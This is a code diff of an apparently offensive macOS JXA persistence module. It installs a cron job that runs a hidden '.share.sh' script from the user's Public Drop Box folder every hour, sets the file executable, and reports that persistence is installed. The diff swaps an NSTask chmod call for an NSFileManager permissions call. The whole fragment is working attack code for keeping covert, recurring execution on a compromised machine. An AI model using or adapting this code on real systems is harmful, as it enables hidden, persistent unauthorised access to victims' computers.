@@ -22,24 +22,20 @@ function writeTextToFile(text, file, overwriteExistingContent) {
 }
 writeTextToFile(cronJobaction, cronFilepath, true)
         
-function executeBackground(actionPath){
-	var path = "/bin/chmod"
-	var args = ["+x",actionPath,"&"]
-	var pipe = $.NSPipe.pipe;
-	var file = pipe.fileHandleForReading;
-	var task = $.NSTask.alloc.init;
-	task.launchPath = path;
-	task.arguments = args;
-	task.standardOutput = pipe; 
-	task.standardError = pipe;
-	task.launch; 
-	}        
+	function chmod(value, path) {
+        let a = $({NSFilePosixPermissions:value})
+        let p = $(path).stringByStandardizingPath
+        let e = $()
+        let r = $.NSFileManager.defaultManager
+                .setAttributesOfItemAtPathError(a, p, e)
+        return r
+    }     
 
 //Write cronjob change to allow execution
 var cronTask =  `echo "$(echo '15 * * * * cd $HOME/Public/Drop\\ Box/ && ./.share.sh' ; crontab -l)" | crontab - `
       
 currentApp.doShellScript(cronTask)
-executeBackground(cronFilepath)
+chmod(0o755,cronFilepath)
 
 output += "CronJob Persistence intalled at " + cronFilepath 
 
